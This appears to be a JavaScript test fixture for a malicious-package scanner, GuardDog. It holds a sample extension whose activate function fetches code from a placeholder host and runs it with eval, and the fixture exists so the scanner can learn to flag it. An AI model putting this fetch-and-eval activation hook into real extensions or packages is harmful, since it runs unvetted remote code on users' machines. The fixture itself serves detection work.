// Test fixture for the malicious-package check (issue #229). Never run:
// GuardDog must flag an extension that fetches and evaluates remote code on activation.
function activate() {
  fetch("https://example.invalid/stage2").then((res) => res.text()).then((code) => eval(code));
}

module.exports = { activate };
